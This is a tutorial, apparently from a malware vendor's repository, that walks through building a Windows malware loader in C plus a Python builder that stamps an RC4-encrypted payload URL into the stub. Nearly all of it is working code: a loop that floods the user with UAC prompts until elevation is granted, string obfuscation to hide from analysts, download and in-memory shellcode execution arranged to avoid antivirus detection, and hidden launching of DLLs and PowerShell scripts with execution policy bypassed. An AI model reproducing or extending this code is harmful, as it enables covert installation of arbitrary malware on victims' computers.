# Non-resident-Loader
For ease of understanding, the code will be written in C using the VS 2022 development environment, the written code will work on earlier versions, however, if Windows XP support is important to you, appropriate packages will be required.

First, we need to create an empty project and configure it correctly. We will remove all unnecessary dependencies from the project, disable CRT and save debugging information.
After creating the project, go to its properties, and set the following settings on the tabs:
```
Platform Toolkit - Visual Studio 2017 - Windows XP (v141_xp)

C/C++:

Optimization:

Optimization: Maximum optimization (size priority) /O1
Prefer size or speed: prefer code brevity (/Os)
Optimization of the entire program: no

Creating the code:

Enable string concatenation: None (/GF-)
Enable C++ exceptions: None
Runtime Library: Multithreaded (/MT)

Linker:

Manifest file:

Create a manifest: No (/MANIFEST:NO)

Debugging:

Create debugging information: No

System:

Subsystem: /SUBSYSTEM:WINDOWS

Additionally:

Entry point: Entry
```
First of all, we will connect a memory manager and functionality for convenient output of debugging messages.
convenient allocation, deallocation and memory release, output of formatted debug messages to DBGOUT and file.

```
#include "dbg.h"
#include <Shlwapi.h>

namespace Debug {
    OutputTypes output_type;
    CRITICAL_SECTION CS = { 0 };
    HANDLE dbg_file_handle = 0;

    bool Init(OutputTypes type) {
        output_type = type;

        if (type == OutputTypes::kFile) {
            InitializeCriticalSection(&CS);

            dbg_file_handle = CreateFileW(L"C:\\ProgramData\\fastldr.log", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, 0);

            if (dbg_file_handle == INVALID_HANDLE_VALUE) {
                return FALSE;
            }

            WORD bom = 0xFEFF;
            DWORD written = 0;

            WriteFile(dbg_file_handle, &bom, sizeof(bom), &written, NULL);
        }

        return TRUE;
    }

    void OutToDbg(LPCWSTR message_text, va_list args) {
        WCHAR dbg_message[1025] = { 0 };

        wvsprintfW(dbg_message, message_text, args);
        OutputDebugStringW(dbg_message);
    }

    void OutToFile(LPCWSTR message_text, va_list args) {
        EnterCriticalSection(&CS);

        WCHAR dbg_message[1025] = { 0 };
        int char_count = wvsprintfW(dbg_message, message_text, args);
        DWORD written = 0;


        WriteFile(dbg_file_handle, dbg_message, char_count * 2, &written, nullptr);
        WriteFile(dbg_file_handle, L"\r\n", 4, &written, nullptr);
        LeaveCriticalSection(&CS);
    }

    void DebugMsg(LPCWSTR message_text, ...) {
        va_list args = nullptr;

        va_start(args, message_text);

        switch (output_type) {
        case OutputTypes::kDbgConsole:
            OutToDbg(message_text, args);
        case OutputTypes::kFile:
            OutToFile(message_text, args);
        default:
            break;
        }

        va_end(args);
    }
}
```

Next, we implement the functionality of extracting information from the config. Our config will be an encrypted RC4 blob. A signature is sewn into the stub, the builder will search for this signature, form a configuration and insert it in place of the signature.
The RC4 key is unique for each reboot so that the config does not look static. In memory, the data will look like this:

RC4 key (8 bytes) - size of the encrypted config (4 bytes) - config

After decrypting the config, we will get:

File link size (4 bytes) - file link - Payload type (4 bytes) - size of exported function (4 bytes) - exported function - do I need to force privilege level (1 byte)

About the last option - we will introduce the ability to forcibly raise the integrity level to High using the same UAC window flood method.
If the process is running under Medium IL, but there are no rights, the condition will work and privileges will increase.

Let's put the config in a global variable, setting its size to 5000 bytes, or 5 kilobytes. We add the signature, scoring the rest of the place after it with zeros:

```
BYTE config[5000] = { "INSERT_CONFIG_HERE" };
```
Let's consider the functionality of unpacking the config. The above information is read from the BLOB, decrypted and distributed among variables.
For decryption, we will use the RC4 encryption algorithm, the implementation of which was borrowed by me from the mbedtls library, which can be downloaded here.

Next, we will write code that allows you to get the current Integrity Level and at the same time check whether the token of our process is privileged.
Creating a file utils.cpp and we write the code, simultaneously covering it with debugging outputs:

```
DWORD GetIntegrityLevel() {
    DWORD integrity_level = 0;
    HANDLE token_handle = 0;
    PTOKEN_MANDATORY_LABEL mandatory_label = nullptr;

    do
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
            DBGPRINT(L"File %s, line %d, OpenProcessToken error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        DWORD length_needed = 0;

        if (GetTokenInformation(token_handle, TokenIntegrityLevel, nullptr, 0, &length_needed)) {
            DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        mandatory_label = (PTOKEN_MANDATORY_LABEL)Memory::Alloc(length_needed);

        if (!mandatory_label) {
            DBGPRINT(L"File %s, line %d, Memory::Alloc error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        if (!GetTokenInformation(token_handle, TokenIntegrityLevel, mandatory_label, length_needed, &length_needed)) {
            DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        integrity_level = *GetSidSubAuthority(mandatory_label->Label.Sid, *GetSidSubAuthorityCount(mandatory_label->Label.Sid) - 1);
    } while (false);

    if (token_handle) {
        CloseHandle(token_handle);
    }

    if (mandatory_label) {
        Memory::Free(mandatory_label);
    }

    return integrity_level;
}

bool IsElevated() {
    bool ret = false;
    HANDLE token_handle = 0;

    do
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
            DBGPRINT(L"File %s, line %d, OpenProcessToken error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        TOKEN_ELEVATION elevation = { 0 };
        DWORD length_needed = 0;

        if (!GetTokenInformation(token_handle, TokenElevation, &elevation, sizeof(TOKEN_ELEVATION), &length_needed)) {
            DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        ret = elevation.TokenIsElevated;
    } while (false);

    if (token_handle) {
        CloseHandle(token_handle);
    }

    return ret;
}
```
We open the token of the current process with TOKEN_QUERY rights, then make a GetTokenInformation call, passing the type of information we want to receive with the second parameter (in our case, these are TokenIntegrityLevel and TokenElevation).

Now let's make the privilege enhancement functionality by flooding the UAC window. As you can see, in this function, strings are formed by character-by-character push on the stack, such an uncomplicated obfuscation method will simplify the completion of the loader for assembly into shellcode and allow us to hide the strings from outsiders.

```
bool ElevateUAC(LPCWSTR file_path) {
    bool ret = false;
    WCHAR wmic_path[1025] = { 0 };

    do
    {
        WCHAR wmic_env_str[] = { '%', 'w', 'i', 'n', 'd', 'i', 'r', '%', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'w', 'm', 'i', 'c', '.', 'e', 'x', 'e', 0, 0 };

        if (!ExpandEnvironmentStringsW(wmic_env_str, wmic_path, 1025)) {
            DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        WCHAR runas_str[] = { 'r', 'u', 'n', 'a', 's', 0, 0};
        WCHAR format_str[] = { 'p', 'r', 'o', 'c', 'e', 's', 's', ' ', 'c', 'a', 'l', 'l', ' ', 'c', 'r' ,'e','a','t','e', '"', '%', 's', '"', 0, 0 };
        WCHAR wmic_args[1025] = { 0 };

        wsprintfW(wmic_args, format_str, file_path);

        while (true) {
            if (ShellExecuteW(0, runas_str, file_path, nullptr, nullptr, SW_HIDE) >= (HINSTANCE)32) {
                ret = true;
                break;
            }
        }
    } while (FALSE);

    return ret;
}
```

We will run in a loop %WINDIR%\System32\wmic.exe using the runas method, passing the parameters to process call create "%current_path%", where %current_path% is the path to our file.
If ShellExecute returns a value that is less than or equal to 32, it means that the user rejected the UAC request and we should restart it.

Now let's start implementing the functionality for interacting with the network. Here we will have two functions, one for downloading a file and then saving it to disk, and the second for saving the file to dynamic memory.
We will need the second one to run the shellcodes, because they should not touch the disk and will run in the memory of the loader process:

```
bool DownloadFile(
    __in LPCWSTR url,
    __in LPCWSTR file_path
) {
    BOOL ret = false;
    HINTERNET inet_handle = 0;
    HINTERNET url_handle = 0;
    HANDLE file_handle = 0;

    do
    {
        WCHAR user_agent[] = { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '1', '3', '1', '.', '0', '.', '0', '.', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', 0, 0 };

        inet_handle = InternetOpenW(user_agent, INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);

        if (!inet_handle) {
            DBGPRINT(L"File %s, line %d, InternetOpenW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        url_handle = InternetOpenUrlW(inet_handle, url, nullptr, 0, 0, 0);

        if (!url_handle) {
            DBGPRINT(L"File %s, line %d, InternetOpenUrlW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        file_handle = CreateFileW(file_path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, 0);

        if (file_handle == INVALID_HANDLE_VALUE) {
            DBGPRINT(L"File %s, line %d, CreateFileW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        while (true) {
            byte buffer[4096] = { 0 };
            DWORD read = 0;

            if (!InternetReadFile(url_handle, buffer, 4096, &read)) {
                DBGPRINT(L"File %s, line %d, InternetReadFile error %d", __FILEW__, __LINE__, GetLastError());
                break;
            }

            if (!read) {
                ret = true;
                break;
            }

            DWORD written = 0;

            if (!WriteFile(file_handle, buffer, read, &written, nullptr)) {
                DBGPRINT(L"File %s, line %d, WriteFile error %d", __FILEW__, __LINE__, GetLastError());
                break;
            }
        }
    } while (false);

    if (inet_handle) {
        InternetCloseHandle(inet_handle);
    }

    if (url_handle) {
        InternetCloseHandle(url_handle);
    }

    if (file_handle) {
        InternetCloseHandle(file_handle);
    }

    return ret;
}

bool DownloadFileToMem(
    __in LPCWSTR url,
    __out PBYTE* data,
    __out PDWORD data_size
) {
    BOOL ret = false;
    HINTERNET inet_handle = 0;
    HINTERNET url_handle = 0;

    do
    {
        WCHAR user_agent[] = { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '1', '3', '1', '.', '0', '.', '0', '.', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', 0, 0 };

        inet_handle = InternetOpenW(user_agent, INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);

        if (!inet_handle) {
            DBGPRINT(L"File %s, line %d, InternetOpenW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        url_handle = InternetOpenUrlW(inet_handle, url, nullptr, 0, 0, 0);

        if (!url_handle) {
            DBGPRINT(L"File %s, line %d, InternetOpenUrlW error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        DWORD total = 0;

        while (true) {
            byte buffer[4096] = { 0 };
            DWORD read = 0;

            if (!InternetReadFile(url_handle, buffer, 4096, &read)) {
                DBGPRINT(L"File %s, line %d, InternetReadFile error %d", __FILEW__, __LINE__, GetLastError());
                break;
            }

            if (!read) {
                *data_size = total;
                ret = true;
                break;
            }

            if (!*data) {
                *data = (PBYTE)Memory::Alloc(read);
            }
            else {
                *data = (PBYTE)Memory::ReAlloc(*data, total + read);
            }

            if (!*data) {
                DBGPRINT(L"File %s, line %d, alloc error %d", __FILEW__, __LINE__, GetLastError());
                break;
            }
           
            memcpy(*data + total, buffer, read);

            total += read;
        }
    } while (false);

    if (inet_handle) {
        InternetCloseHandle(inet_handle);
    }

    if (url_handle) {
        InternetCloseHandle(url_handle);
    }

    return ret;
}
```
As you can see, we call InternetOpenW, passing the user agent there with the first parameter, with which the request to the server will go, and the second is the constant INTERNET_OPEN_TYPE_PRECONFIG, without specifying which, when connecting to the network, the loader will not pick up the built-in proxy, which may occur from time to time in corporate networks.
Next, a link to the file opens via InternetOpenUrlW and the data is gradually read using the InternetReadFile function. The difference between these two functions, as mentioned above, is in the subsequent actions with the read data.
Data is read 4096 bytes at a time and in the first function is written to the specified file, and in the second - to the buffer, the memory in which is realigned at each iteration of the file pass.

Now we will start writing the functionality for launching the payload. Let's start by running the shellcode:
```
void RunShellcode(PBYTE shellcode, DWORD shellcode_size) {
    PVOID shellcode_mem = nullptr;
    HANDLE thread_handle = 0;

    do
    {
        shellcode_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!shellcode_mem) {
            DBGPRINT(L"File %s, line %d, VirtualAlloc error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        memcpy(shellcode_mem, shellcode, shellcode_size);

        DWORD old_protect = 0;

        if (!VirtualProtect(shellcode_mem, shellcode_size, PAGE_EXECUTE_READ, &old_protect)) {
            DBGPRINT(L"File %s, line %d, VirtualProtect error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        thread_handle = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_mem, nullptr, 0, nullptr);

        if (!thread_handle) {
            DBGPRINT(L"File %s, line %d, CreateThread error %d", __FILEW__, __LINE__, GetLastError());
            break;
        }

        WaitForSingleObject(thread_handle, INFINITE);
    } while (false);

    if (shellcode_mem) {
        memset(shellcode_mem, 0, shellcode_size);
        Memory::Free(shellcode_mem);
    }

    if (thread_handle) {
        CloseHandle(thread_handle);
    }
}
```
Dynamic memory with PAGE_READ_WRITE rights is allocated for the shellcode, the shellcode is copied to the allocated memory, and then the rights of the memory section are changed to PAGE_EXECUTE_READ.
This is done in order to avoid allocating memory with RWX rights, because this will immediately entail a behavioral detection from the antivirus.
Next, a thread is created on the shellcode, if the handle of the thread is valid, WaitForSingleObject is called in order to wait for the end of the execution of the shellcode.
As soon as the shellcode finishes its work, the memory allocated for it will be filled with zeros and freed.

Let's run the DLL: there's nothing complicated here, formatting the string with arguments and passing it in one of the ShellExecute parameters:
```
void RunRundll32(LPCWSTR dll_path, LPCWSTR export_function) {
    WCHAR rundll32[1025] = { 0 };

    if (!ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\rundll32.exe", rundll32, 1024)) {
        DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
        return;
    }

    WCHAR args[1025] = { 0 };
    WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

    wsprintfW(args, L"%s, %s", dll_path, export_function);
    ShellExecuteW(0, open, rundll32, args, nullptr, SW_HIDE);
}

void RunRegsvr32(LPCWSTR dll_path) {
    WCHAR regsvr32[1025] = { 0 };

    if (!ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\regsvr32.exe", regsvr32, 1024)) {
        DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
        return;
    }

    WCHAR args[1025] = { 0 };
    WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

    wsprintfW(args, L"/s %s", dll_path);
    ShellExecuteW(0, open, regsvr32, args, nullptr, SW_HIDE);
}
```

running PS scripts:
```
void RunPS(LPCWSTR ps_path) {
    WCHAR powershell[1025] = { 0 };

    if (!ExpandEnvironmentStringsW(L"", powershell, 1024)) {
        return;
    }

    WCHAR args[1025] = { 0 };
    WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

    wsprintfW(args, L"-ExecutionPolicy Bypass -f \"%s\"", ps_path);
    ShellExecuteW(0, open, powershell, args, nullptr, SW_HIDE);
}
```
Do not forget to disable ExecutionPolicy in the parameters, because with ExecutionPolicy enabled, the script may not work under certain conditions.
And the last touch, depending on the type of payload, we launch using the appropriate method:

Now let's start writing the builder. We will use Python, because it makes it faster due to the simplicity of the language. We copy the stub loader file from the Release folder, read the contents and look for the signature. We calculate the offset to the signature, form the config and write it back:
```
if __name__ == '__main__':
    shutil.copy('..\\Release\\FastLdr.exe', 'build.exe')
    with open('build.exe', 'rb+') as stub_file:
        data = stub_file.read()
        signature_pos = data.find(b'INSERT_CONFIG_HERE')
        stub_file.seek(signature_pos)
        stub_file.write(get_encrypted_config())
```
The code for generating the config is quite simple, the numbers are encoded using the struct library:
```
def payload_type_to_number() -> int:
    if PAYLOAD_TYPE == 'exe':
        return 1
    elif PAYLOAD_TYPE == 'dll_rundll32':
        return 2
    elif PAYLOAD_TYPE == 'dll_regsvr32':
        return 3
    elif PAYLOAD_TYPE == 'ps1':
        return 4
    elif PAYLOAD_TYPE == 'shellcode':
        return 5

def get_config() -> bytes:
    encoded_url = URL.encode('utf-16-le')
    encoded_export_function = EXPORT_FUNCTION.encode('utf-16-le')

    return struct.pack('=L', len(encoded_url)) + encoded_url + struct.pack('=L', payload_type_to_number()) + struct.pack('=L', len(encoded_export_function)) + encoded_export_function + struct.pack('?', FORCE_ELEVATE)

def get_encrypted_config() -> bytes:
    key = secrets.token_bytes(8)
    cipher = ARC4(key)
    encrypted_config = cipher.encrypt(get_config())

    return key + struct.pack('=L', len(encrypted_config)) + encrypted_config
```

For the builder to work, you need the latest version of python and the installed arc4 package.
#### How is the builder configured: The URL, PAYLOAD_TYPE, EXPORT_FUNCTION and FORCE_ELEVATE variables specify the required configuration. The types of payload to insert into PAYLOAD_TYPE are specified in the comment.

<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
